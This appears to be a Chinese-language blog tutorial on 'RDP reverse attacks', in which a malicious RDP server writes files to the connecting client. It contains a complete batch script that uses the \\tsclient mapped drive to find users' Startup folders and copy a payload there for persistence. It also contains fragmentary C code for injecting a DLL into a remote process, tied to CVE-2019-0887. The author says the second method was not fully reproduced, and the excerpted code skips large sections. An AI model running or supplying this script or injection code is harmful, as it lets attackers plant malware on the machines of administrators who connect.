RDP反向攻击

介绍

这里讲两种攻击方式：

  • 利用挂载盘符进行攻击

  • 利用CVE-2019-0887进行攻击

两者都是在攻击的登录远程桌面时，向攻击者PC的启动目录写入恶意文件，需要重启才能运行恶意文件。
我这里测试的时候，存在很多问题，尤其是后者，较不稳定，按照严格意义并没有复现成功，也许是操作系统问题，也许是代码问题。

利用挂载盘符

原理是通过访问tsclient，并通过目录遍历找到启动目录，将恶意文件写入其中。
tsclient是通过远程桌面连接到远程计算机时，自动分配的一个主机名。
利用该方式的前提是需要开启挂载盘符。

当开启后，在被登录服务器端执行命令:
dir \tsclient\c
但是要执行其他命令就会拒绝访问。
这里给出一个bat脚本，运行后就可以自动对登录PC的启动项进行写入。

  1. @echo off
  2. timeout 1 >nul 2>&1
  3. mkdir \\tsclient\c\temp >nul 2>&1
  4. mkdir C:\temp >nul 2>&1
  5. copy run.bat C:\temp >nul 2>&1
  6. copy run.bat \\tsclient\c\temp >nul 2>&1
  7. del /q %TEMP%\temp_00.txt >nul 2>&1
  8. set dirs=dir /a:d /b /s \\tsclient\c\users\*startup*
  9. echo|%dirs%|findstr /i "Microsoft\Windows\Start Menu\Programs\Startup">>"%TEMP%\temp_00.txt"
  10. for /F "tokens=*" %%a in (%TEMP%\temp_00.txt) DO (
  11.     copy run.bat "%%a" >nul 2>&1
  12.     copy C:\temp\run.bat "%%a" >nul 2>&1
  13.     copy \\tsclient\c\temp\run.bat "%%a" >nul 2>&1
  14. )
  15. del /q %TEMP%\temp_00.txt >nul 2>&1

测试中第一次没成功，好像是权限问题，拒绝访问。
换了个环境测试，成功写入。

  81. BOOL InjectDll(UINT32 ProcessId, char *DllPath)
  82. {
  83.     if (strstr(DllPath, "\\\\") != 0)
  84.     {
  85.         printf("[!]Wrong Dll path\n");
  86.         return FALSE;
  87.     }
  88.     if (strstr(DllPath, "\\") == 0)
  89.     {
  90.         printf("[!]Need Dll full path\n");
  91.         return FALSE;
  92.     }

  94.     size_t len = strlen(DllPath) + 1;
  95.     size_t converted = 0;
  96.     wchar_t* DllFullPath;
  97.     DllFullPath = (wchar_t*)malloc(len * sizeof(wchar_t));
  98.     mbstowcs_s(&converted, DllFullPath, len, DllPath, _TRUNCATE);

  100.     LPVOID pThreadData = NULL;
  101.     LPVOID pCode = NULL;
  102.     HANDLE ProcessHandle = NULL;
  103.     HANDLE hThread = NULL;
  104.     BOOL bRet = FALSE;

  106.     __try
  107.     {
  108.         ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
  109.         if (ProcessHandle == NULL)
  110.         {
  111.             printf("[!]OpenProcess error\n");
  112.             __leave;
  113.         }
  114.         THREAD_DATA data;
  115.         HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
  116.         data.fnRtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
  117.         data.fnLdrLoadDll = (pLdrLoadDll)GetProcAddress(hNtdll, "LdrLoadDll");
  118.         memcpy(data.DllName, DllFullPath, (wcslen(DllFullPath) + 1) * sizeof(WCHAR));
  119.         data.DllPath = NULL;
  120.         data.Flags = 0;
  121.         data.ModuleHandle = INVALID_HANDLE_VALUE;
  122.         pThreadData = VirtualAllocEx(ProcessHandle, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  181. BOOL EnableDebugPrivilege(BOOL fEnable)

  183.     BOOL fOk = FALSE;

  192.         fOk = (GetLastError() == ERROR_SUCCESS);

  194.     }
  195.     return(fOk);
